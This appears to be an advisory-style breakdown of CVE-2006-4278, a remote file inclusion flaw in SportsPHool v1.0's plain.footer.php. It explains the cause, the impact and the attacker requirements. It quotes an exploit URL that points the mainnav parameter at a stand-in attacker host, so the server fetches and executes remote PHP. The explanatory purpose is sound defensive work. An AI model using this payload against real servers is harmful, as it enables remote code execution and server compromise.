Based on the provided information, here's a breakdown of the vulnerability:

**CVE ID:** CVE-2006-4278

**Vulnerable Software:** SportsPHool v1.0

**Root Cause of Vulnerability:**
The vulnerability stems from a lack of proper input sanitization in the `mainnav` parameter of the `plain.footer.php` file within the SportsPHool application. Specifically, the application directly includes the content from the provided `mainnav` URL without proper validation.

**Weaknesses/Vulnerabilities Present:**
- **Remote File Inclusion (RFI):** The primary vulnerability is an RFI, allowing an attacker to include a remote file from a URL they control.

**Impact of Exploitation:**
- **Arbitrary Code Execution:** By including a malicious PHP file, an attacker can achieve arbitrary code execution on the vulnerable server.
- **Complete System Compromise:** Successfully exploiting the RFI vulnerability could lead to complete system compromise if the attacker gains sufficient privileges via the included malicious code.

**Attack Vectors:**
- **HTTP GET Request:** The attacker sends an HTTP GET request to the vulnerable `plain.footer.php` script.
- **`mainnav` Parameter Manipulation:**  The `mainnav` parameter is manipulated to point to a remote file under the attacker's control.

**Required Attacker Capabilities/Position:**
- **Network Access:** The attacker needs network access to the vulnerable server.
- **Knowledge of Vulnerable Parameter:** The attacker must know the vulnerable parameter (`mainnav`) within the `plain.footer.php` file.
- **Ability to Host Malicious File:** The attacker needs to host a malicious PHP file on a server they control.

**Technical Details:**
The exploit example provided in exploit-db is:
`http://www.site.com/[SportsPHool_path]/includes/layout/plain.footer.php?mainnav=[http://www.myevilsite.com/evil_scripts.txt]`

This demonstrates how the `mainnav` parameter can be used to include a remote file from the attacker's controlled domain (`www.myevilsite.com`). The included file, `evil_scripts.txt`, would be executed as PHP code on the server.

This exploit leverages the lack of input sanitization, allowing remote file inclusion and potential arbitrary code execution.
